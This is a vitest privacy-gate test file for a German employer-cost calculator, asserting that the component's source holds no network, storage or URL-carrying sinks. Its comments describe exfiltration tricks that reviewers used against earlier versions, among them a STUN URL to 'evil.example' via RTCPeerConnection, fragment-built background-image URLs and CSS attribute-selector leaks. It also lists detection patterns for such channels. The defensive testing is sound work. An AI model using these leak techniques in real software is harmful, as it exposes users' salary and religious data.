import { describe, it, expect } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';

/**
 * §29 — the non-negotiable half.
 *
 * What gets typed into this calculator is a salary, a family situation, a
 * Bundesland, and whether the person belongs to a church. The last of those is
 * data about religious belief: special-category data under GDPR Article 9, and
 * the only reliable way to protect it is for it never to leave the browser.
 *
 * The rules and their shape are inherited from the Czech calculator's suite,
 * which was written after a reviewer got a working tracking pixel past 315
 * assertions by using `<img src>` — an attribute, not one of the transmission
 * APIs the sink list chased. The lesson was that enumerating sinks is the wrong
 * shape of rule, because the next sink is always the one nobody listed. So the
 * rule is inverted: this component needs no external origin at all, and any
 * absolute URL in it fails regardless of what would have carried it.
 *
 * Source assertions rather than runtime ones, deliberately: a runtime test
 * proves only the paths it happened to exercise, while reading the source
 * catches a `fetch` added to a branch no test reaches.
 */

const ROOT = path.join(__dirname, '..', '..', '..');
const read = (rel: string) => fs.readFileSync(path.join(ROOT, rel), 'utf8');

const COMPONENT = 'components/DeEmployerCostCalculator.tsx';
const ENGINE_DIR = 'lib/calculators/de-employer-cost';

const ENGINE_FILES = [
  'engine.ts',
  'scope.ts',
  'validation.ts',
  'decimal.ts',
  'formatting.ts',
  'copy.ts',
  'types.ts',
  'unsupported.ts',
  'social/bvv.ts',
  'social/branches.ts',
  'tax/pap-2026.ts',
  'tax/church-tax.ts',
].map((f) => `${ENGINE_DIR}/${f}`);

const DATA_FILES = [
  'data/calculators/de-employer-cost/2026/rules.ts',
  'data/calculators/de-employer-cost/2026/sources.ts',
  'data/calculators/de-employer-cost/2026/pap/provenance.ts',
  'data/calculators/de-employer-cost/2026/pap/prueftabellen.ts',
  'data/calculators/de-employer-cost/types.ts',
];

/**
 * Everything the component can actually reach, followed transitively.
 *
 * The list used to be two hard-coded directories, which meant a leak in any NEW
 * module the component imports was never scanned at all — a literal `fetch()`
 * to an external host in `components/helper.ts` would have passed all 377
 * assertions. The set of files that matter is not a directory, it is the import
 * closure of the component, so that is what is computed.
 */
function importClosure(entry: string): string[] {
  const seen = new Set<string>();
  const queue = [entry];
  while (queue.length) {
    const rel = queue.shift()!;
    if (seen.has(rel)) continue;
    const abs = path.join(ROOT, rel);
    if (!fs.existsSync(abs)) continue;
    seen.add(rel);
    const src = fs.readFileSync(abs, 'utf8');
    for (const m of src.matchAll(/(?:from|import)\s*\(?\s*['"`]([^'"`]+)['"`]/g)) {
      const spec = m[1];
      if (!spec.startsWith('.')) continue; // node_modules and framework are not ours
      const resolvedBase = path.relative(ROOT, path.resolve(path.dirname(abs), spec));
      for (const cand of [
        resolvedBase,
        `${resolvedBase}.ts`,
        `${resolvedBase}.tsx`,
        `${resolvedBase}/index.ts`,
        `${resolvedBase}/index.tsx`,
      ]) {
        if (fs.existsSync(path.join(ROOT, cand)) && fs.statSync(path.join(ROOT, cand)).isFile()) {
          queue.push(cand);
          break;
        }
      }
    }
  }
  return [...seen];
}

const CLOSURE = importClosure(COMPONENT);
const ALL = Array.from(new Set([COMPONENT, ...ENGINE_FILES, ...DATA_FILES, ...CLOSURE]));

/**
 * Strip comments so prose ABOUT `fetch` cannot fail a code assertion.
 *
 * STRING-AWARE, and it has to be. The obvious two-regex version —
 *
 *     src.replace(/\/\*[\s\S]*?\*\//g, '').replace(/(^|[^:])\/\/.*$/gm, '$1')
 *
 * — treats a `//` INSIDE a string literal as the start of a comment. So
 * `const a = "//evil.example/x"` was handed to the assertions as `const a = "`,
 * and the protocol-relative check three hundred lines below could never fire on
 * the one construct it exists to catch. A review pass found it by reading the
 * helper rather than the rules, which is the right place to look: a gate's
 * preprocessing is the part nobody tests.
 *
 * This walks the source once, tracking whether it is inside '', "", `` or a
 * comment, and removes only real comments. String CONTENT is preserved intact,
 * because for this file the content of a string literal is the evidence.
 */
function code(src: string): string {
  let out = '';
  let i = 0;
  let quote: string | null = null;
  while (i < src.length) {
    const c = src[i];
    const next = src[i + 1];
    if (quote) {
      out += c;
      if (c === '\\') { out += next ?? ''; i += 2; continue; }
      if (c === quote) quote = null;
      i++;
      continue;
    }
    if (c === "'" || c === '"' || c === '`') { quote = c; out += c; i++; continue; }
    if (c === '/' && next === '/') {
      while (i < src.length && src[i] !== '\n') i++;
      continue;
    }
    if (c === '/' && next === '*') {
      const end = src.indexOf('*/', i + 2);
      const chunk = src.slice(i, end === -1 ? src.length : end + 2);
      // Preserve newlines so reported line numbers stay true.
      out += chunk.replace(/[^\n]/g, '');
      i = end === -1 ? src.length : end + 2;
      continue;
    }
    out += c;
    i++;
  }
  return out;
}

/**
 * Strip string literals as well, for the assertions that are about what the
 * code DOES rather than what it references.
 *
 * The source registry's notes are English prose describing evidence, and one of
 * them contains the sentence "The one document that states every 2026 rate…".
 * A bare /\bdocument\b/ read that as the browser global and failed a purity
 * check on a file that has no code in it at all. The registry's whole job is to
 * talk about documents.
 *
 * Deliberately NOT applied to the component's URL assertions: there, a string
 * literal is exactly the thing being checked.
 */
const codeOnly = (src: string) =>
  code(src)
    .replace(/'(?:[^'\\\n]|\\.)*'/g, "''")
    .replace(/"(?:[^"\\\n]|\\.)*"/g, '""')
    .replace(/`(?:[^`\\]|\\.)*`/g, '``');

describe('every file exists — the list cannot silently stop covering things', () => {
  // A path that has been renamed makes its assertions vacuous rather than
  // failing, which is the quietest way for a privacy gate to stop working.
  for (const f of ALL) {
    it(`${f} is present`, () => {
      expect(fs.existsSync(path.join(ROOT, f)), f).toBe(true);
    });
  }

  it('scans every module the component can reach, however new', () => {
    // The hand-written lists are kept as a floor; the closure is the ceiling.
    // If the component grows a dependency in a directory nobody thought of,
    // this is what puts it under the rules rather than outside them.
    expect(CLOSURE.length, 'the import closure is implausibly small').toBeGreaterThan(5);
    expect(CLOSURE).toContain(COMPONENT);
    for (const f of ENGINE_FILES) {
      if (/copy|types|unsupported|decimal|formatting|scope|validation|engine|bvv|branches|pap-2026|church-tax/.test(f)) {
        expect(CLOSURE, `${f} is not reachable from the component`).toContain(f);
      }
    }
  });

  it('covers every non-test source file in the engine', () => {
    const found: string[] = [];
    const walk = (dir: string) => {
      for (const e of fs.readdirSync(path.join(ROOT, dir), { withFileTypes: true })) {
        const rel = `${dir}/${e.name}`;
        if (e.isDirectory()) walk(rel);
        else if (/\.tsx?$/.test(e.name) && !/\.test\.tsx?$/.test(e.name)) found.push(rel);
      }
    };
    walk(ENGINE_DIR);
    walk('data/calculators/de-employer-cost');
    // The reference interpreter is test-only and never reaches a page, so it is
    // the one exception — named explicitly rather than pattern-matched away.
    const covered = new Set([...ENGINE_FILES, ...DATA_FILES, `${ENGINE_DIR}/reference/pap-interpreter.ts`]);
    const uncovered = found.filter((f) => !covered.has(f));
    expect(uncovered, `not covered by the privacy gate:\n${uncovered.join('\n')}`).toEqual([]);
  });
});

describe('the calculator transmits nothing', () => {
  const FORBIDDEN: Array<[string, RegExp]> = [
    ['fetch', /\bfetch\s*\(/],
    ['XMLHttpRequest', /XMLHttpRequest/],
    ['sendBeacon', /sendBeacon/],
    ['WebSocket', /\bWebSocket\b/],
    ['EventSource', /\bEventSource\b/],
    ['axios', /\baxios\b/],
    ['gtag', /\bgtag\s*\(/],
    ['dataLayer', /dataLayer/],
    ['WebmasterID', /webmaster|wmid/i],
    ['localStorage', /localStorage/],
    ['sessionStorage', /sessionStorage/],
    ['IndexedDB', /indexedDB/i],
    ['document.cookie', /document\s*\.\s*cookie/],
    ['history writes', /pushState|replaceState/],
    ['location assignment', /location\s*\.\s*(href|search|hash|assign|replace)\s*=/],
    ['URLSearchParams', /URLSearchParams/],
    ['btoa / atob', /\b(btoa|atob)\s*\(/],
    ['form action', /\baction\s*=/],
    ['form method', /\bmethod\s*=/],
  ];

  for (const file of ALL) {
    const src = code(read(file));
    for (const [label, re] of FORBIDDEN) {
      it(`${file} contains no ${label}`, () => {
        expect(re.test(src)).toBe(false);
      });
    }
  }
});

describe('the engine is pure', () => {
  it('reaches no browser global', () => {
    for (const file of [...ENGINE_FILES, ...DATA_FILES]) {
      const src = codeOnly(read(file));
      expect(/\bwindow\b/.test(src), `${file} touches window`).toBe(false);
      expect(/\bdocument\b/.test(src), `${file} touches document`).toBe(false);
      expect(/\bnavigator\b/.test(src), `${file} touches navigator`).toBe(false);
    }
  });

  it('never reads the clock, so a 2026 result stays reproducible', () => {
    for (const file of [...ENGINE_FILES, ...DATA_FILES]) {
      const src = codeOnly(read(file));
      expect(/Date\.now\s*\(/.test(src), `${file} calls Date.now()`).toBe(false);
      expect(/new Date\s*\(\s*\)/.test(src), `${file} reads the current date`).toBe(false);
    }
  });

  it('uses no randomness', () => {
    for (const file of [...ENGINE_FILES, ...DATA_FILES]) {
      expect(/Math\.random/.test(codeOnly(read(file))), `${file}`).toBe(false);
    }
  });
});

describe('nothing financial or personal can reach a URL', () => {
  const src = code(read(COMPONENT));

  it('the component writes no query string and no fragment', () => {
    const hrefs = Array.from(src.matchAll(/href=\{?["']?([^"'}\s]+)/g), (m) => m[1]);
    for (const h of hrefs) {
      expect(h.includes('?'), `href ${h} carries a query string`).toBe(false);
      expect(h.includes('#'), `href ${h} carries a fragment`).toBe(false);
    }
  });

  /**
   * Every href is a CONSTANT. Found by defeating the rule above.
   *
   * A review pass wrote `<Link href={'/r/' + netCent}>`. It has no query string
   * and no fragment, so it passed; it is an internal path, so no external-origin
   * rule touched it. And Next.js prefetches it — putting the reader's net wage
   * in our own server's access log, which is precisely what this page promises
   * never happens. "It only goes to our own server" is not a defence when the
   * page says the calculation never leaves the browser.
   *
   * Checking the SHAPE of the href rather than its content is what closes this:
   * a path that cannot vary cannot carry anything. This component links to one
   * place, and that place is a constant.
   */
  it('every href is a constant, so no path segment can carry a value', () => {
    // A JSX ATTRIBUTE spread defeats a rule that looks for the literal
    // characters `href=`, so it is refused. Scoped to a spread inside an
    // opening tag: ordinary object and array spreads (`{ ...r }` in a state
    // updater, `[...current, id]`) are not attribute carriers and are used
    // legitimately in this file.
    expect(
      /<[A-Za-z][^>]*\{\s*\.\.\./s.test(src),
      'a JSX attribute spread can carry any attribute past the href rules',
    ).toBe(false);
    const exprs = Array.from(src.matchAll(/href=(\{[^}]*\}|"[^"]*")/gi), (m) => m[1].trim());
    expect(exprs.length, 'no href found — has the cross-link gone?').toBeGreaterThan(0);
    const ALLOWED = new Set(['{CROSS_LINK_PATH[locale]}']);
    for (const e of exprs) {
      const literal = /^"\/[a-z0-9/-]*"$/.test(e);
      expect(
        literal || ALLOWED.has(e),
        `href expression is computed rather than constant: ${e}`,
      ).toBe(true);
    }
  });

  it('submitting the form cannot serialise values into a URL', () => {
    expect(/onSubmit=\{\(e\)\s*=>\s*e\.preventDefault\(\)\}/.test(src)).toBe(true);
  });

  it('offers no share or copy-link mechanism', () => {
    expect(/navigator\s*\.\s*share/.test(src)).toBe(false);
    expect(/navigator\s*\.\s*clipboard/.test(src)).toBe(false);
    expect(/writeText/.test(src)).toBe(false);
    expect(/execCommand/.test(src)).toBe(false);
  });

  it('the cross-link targets are clean canonical paths', () => {
    const copySrc = code(read(`${ENGINE_DIR}/copy.ts`));
    const literals = Array.from(copySrc.matchAll(/'(\/[a-z/-]+)'/g), (m) => m[1]);
    for (const target of ['/cena-neobsazene-pozice', '/en/cost-of-vacancy', '/de/kosten-unbesetzter-stellen']) {
      expect(literals, `missing cross-link ${target}`).toContain(target);
    }
    for (const l of literals) {
      expect(l.includes('?'), `path ${l} carries a query string`).toBe(false);
      expect(l.includes('#'), `path ${l} carries a fragment`).toBe(false);
    }
  });
});

describe('no external origin can be referenced at all', () => {
  const src = code(read(COMPONENT));

  it('contains no absolute URL', () => {
    const urls = Array.from(src.matchAll(/https?:\/\/[^\s'"`)]+/g), (m) => m[0]);
    expect(urls, `absolute URLs in the calculator: ${urls.join(', ')}`).toEqual([]);
  });

  it('contains no protocol-relative or bare-host reference', () => {
    expect(/["'`]\/\/[a-z0-9.-]+\./i.test(src), 'protocol-relative URL').toBe(false);
  });

  it('references no request-issuing attribute or API', () => {
    const SINKS: Array<[string, RegExp]> = [
      // Case-INSENSITIVE, and xlink included: `xlinkHref` on an SVG <use>
      // issues a real request on render and matched neither the href rules nor
      // the `src=` sink while both were anchored on lowercase.
      ['src attribute', /\bsrc\s*=/i],
      ['xlink', /xlink/i],
      ['srcSet', /\bsrcSet\b/i],
      ['poster', /\bposter\s*=/],
      ['<link> preload', /rel\s*=\s*["'{]?\s*(preload|prefetch|preconnect)/i],
      ['new Image()', /new\s+Image\s*\(/],
      ['background-image', /background-?image/i],
      ['CSS url()', /\burl\s*\(/i],
      ['dynamic node insertion', /appendChild|insertBefore|insertAdjacent/],
      ['iframe', /<iframe/i],
      ['import()', /\bimport\s*\(/],
    ];
    for (const [label, re] of SINKS) {
      expect(re.test(src), `${label} is present in the calculator`).toBe(false);
    }
  });

  /**
   * The rule that actually closes the sink list, found by trying to defeat it.
   *
   * A review pass got a working leak past all 372 assertions above with a div
   * whose `style` carried `backgroundImage: 'url(' + [...].join('') + net + ')'`
   * — no absolute URL literal anywhere, because the host was assembled from
   * fragments, and `backgroundImage` in camelCase does not match a
   * `background-image` pattern. The runtime wire test in
   * tests/e2e caught it; the source gate did not, and the source gate is the one
   * that runs without a browser.
   *
   * Enumerating one more sink would leave the next one open. So the rule is
   * structural instead: this component styles itself with CSS classes and has
   * no inline style at all, which is true today and is the property that makes
   * that whole family of leaks unwritable. Any inline style fails, and so does
   * any string literal carrying a scheme or a protocol-relative prefix — which
   * is what assembling a host out of fragments has to produce eventually.
   */
  it('uses no inline style and builds no URL out of fragments', () => {
    expect(/\bstyle\s*=/.test(src), 'inline style in the calculator').toBe(false);

    const literals = Array.from(src.matchAll(/'((?:[^'\\\n]|\\.)*)'|"((?:[^"\\\n]|\\.)*)"/g), (m) =>
      (m[1] ?? m[2] ?? '').toLowerCase(),
    );
    for (const l of literals) {
      expect(l.includes('http'), `string literal contains a scheme: "${l}"`).toBe(false);
      expect(l.includes('//'), `string literal contains "//": "${l}"`).toBe(false);
    }
  });

  /**
   * ANY URI scheme, not just http.
   *
   * A review pass designed a leak that carried the net wage and the Article-9
   * church flag out through `new RTCPeerConnection({ iceServers: [{ urls:
   * 'stun:' + tag + '.evil.example' }] })`. It defeated both layers at once: the
   * source gate knew only `http` and `//`, and the Playwright wire watcher
   * observes HTTP requests, so a STUN/UDP resolution and its DNS lookup are
   * invisible to it.
   *
   * The fix is not to add `stun` to a list. It is to stop enumerating schemes:
   * this component has no business naming ANY scheme, so any `word:` that looks
   * like one fails.
   */
  it('names no URI scheme of any kind', () => {
    const literals = Array.from(src.matchAll(/'((?:[^'\\\n]|\\.)*)'|"((?:[^"\\\n]|\\.)*)"|`((?:[^`\\]|\\.)*)`/g), (m) =>
      m[1] ?? m[2] ?? m[3] ?? '',
    );
    for (const l of literals) {
      const m = /\b([a-z][a-z0-9+.-]{1,15}):/i.exec(l);
      // A bare "word:" inside prose is not a scheme; require it to be the whole
      // literal's start or to be followed by something URL-shaped.
      if (m && /^[a-z][a-z0-9+.-]{1,15}:(\/\/|[a-z0-9])/i.test(l.trim())) {
        expect.fail(`string literal names a URI scheme: "${l.slice(0, 60)}"`);
      }
    }
  });

  /**
   * Sinks that issue a request without any of the APIs already listed, and
   * ambient browser state that leaves the machine without this code issuing a
   * request at all.
   *
   * The second half matters because a third-party analytics bundle is mounted
   * on this page by the site chrome. Parking a payroll figure in
   * `document.title` or `window.name` hands it to that bundle without this
   * component making a single request — and the component was exempt from the
   * browser-global purity check that covers the engine.
   */
  it('opens no other request channel and parks nothing in ambient state', () => {
    const CHANNELS: Array<[string, RegExp]> = [
      ['RTCPeerConnection', /RTCPeerConnection/],
      ['window.open', /\bopen\s*\(/],
      ['<object data>', /<object\b|\bdata\s*=\s*\{/i],
      ['<embed>', /<embed\b/i],
      ['anchor ping', /\bping\s*=/],
      ['formAction', /formAction/i],
      ['meta refresh', /http-equiv/i],
      ['navigator.*', /\bnavigator\s*\./],
      ['importScripts / worker', /importScripts|new\s+Worker|serviceWorker/],
    ];
    for (const [label, re] of CHANNELS) {
      expect(re.test(src), `${label} is present in the calculator`).toBe(false);
    }

    const AMBIENT: Array<[string, RegExp]> = [
      ['document.title', /document\s*\.\s*title/],
      ['window.name', /window\s*\.\s*name/],
      ['history.state', /history\s*\.\s*(state|pushState|replaceState)/],
      ['document.cookie', /document\s*\.\s*cookie/],
      ['any window access', /\bwindow\s*\./],
      ['any document access', /\bdocument\s*\./],
      // The aliases. `globalThis.name = net` parks the wage in window.name for
      // the analytics bundle without the string "window" appearing anywhere.
      ['globalThis', /\bglobalThis\b/],
      ['self / top / parent / frames', /\b(self|top|parent|frames)\s*\./],
      ['bracket access to a global', /\b(globalThis|window|self|top)\s*\[/],
    ];
    for (const [label, re] of AMBIENT) {
      expect(re.test(src), `${label} is written by the calculator`).toBe(false);
    }
  });

  /**
   * No attribute carries a computed value out to CSS.
   *
   * The leak this closes is a two-file conspiracy: a `data-net={netCent}` on the
   * results div plus one attribute-selector rule in styles.css, which no test in
   * this suite reads, exfiltrating digit by digit through background-image
   * requests. Neither file alone looks wrong.
   *
   * `data-severity` on the notes list is the one attribute that legitimately
   * varies, and it carries a fixed vocabulary of three words, none of them
   * derived from an input.
   */
  it('the stylesheet cannot read a value out of this component', () => {
    // The conspirator half. The data-attribute rule exists because an attribute
    // plus one CSS attribute-selector rule exfiltrates digit by digit through
    // background-image — and styles.css was read by no test at all, so only
    // half the conspiracy was ever inspected.
    const css = fs.readFileSync(path.join(ROOT, 'styles.css'), 'utf8');
    const eccRules = css.split('}').filter((r) => /\.ecc/.test(r));
    for (const rule of eccRules) {
      // One attribute selector is allowed by name: data-severity, whose values
      // are a fixed vocabulary of three words set by the engine and never
      // derived from an input. Any other attribute selector could pair with an
      // attribute carrying a figure.
      const selector = rule.split('{')[0];
      const attrSelectors = Array.from(selector.matchAll(/\[([a-zA-Z-]+)/g), (m) => m[1]);
      for (const a of attrSelectors) {
        expect(a, `an attribute selector on .ecc other than data-severity: ${selector.trim()}`).toBe('data-severity');
      }
      expect(/url\s*\(/i.test(rule), `.ecc rule issues a request: ${rule.trim().slice(0, 80)}`).toBe(false);
    }
  });

  it('puts no computed value into any attribute that CSS or a URL can read', () => {
    // Not just data-*: className, id, title and aria-* are all selectable and
    // all can carry a number.
    const ATTR = /\b(data-[a-z-]+|className|id|title|aria-[a-z-]+)\s*=\s*(\{[^}]*\}|"[^"]*")/g;
    const attrs = Array.from(src.matchAll(ATTR), (m) => [m[1], m[2]] as const);
    for (const [name, value] of attrs) {
      if (name === 'data-severity') {
        expect(value, 'data-severity must carry the note severity and nothing else').toBe('{n.severity}');
        continue;
      }
      // Allowed dynamic values: a locale-keyed lookup and a loop key. Neither
      // can carry a figure, and both are named rather than pattern-matched.
      const ALLOWED_DYNAMIC = new Set(['{LANG[locale]}', '{c.key}', '{n.key}', '{i.field}', '{k}', '{b}', '{c.id}']);
      if (ALLOWED_DYNAMIC.has(value)) continue;
      // A translation lookup. `tr(FIELD.u1)` resolves to a fixed sentence from
      // copy.ts and cannot carry a figure — the copy module holds no input and
      // is itself inside this gate's file list.
      if (/^\{tr\([A-Z_]+(\.[A-Za-z0-9_]+)?\)\}$/.test(value)) continue;
      expect(/^"[a-zA-Z0-9 _-]*"$/.test(value), `${name} carries a computed value: ${value}`).toBe(true);
    }
  });

  /**
   * The registry legitimately holds absolute URLs — they are the evidence. It
   * must never be imported by the component, because that would put those URLs
   * in the page's bundle where an attribute could reach them.
   */
  it('the source registry with its URLs is not reachable from the component', () => {
    expect(/sources['"]/.test(src), 'component imports the source registry').toBe(false);
  });
});
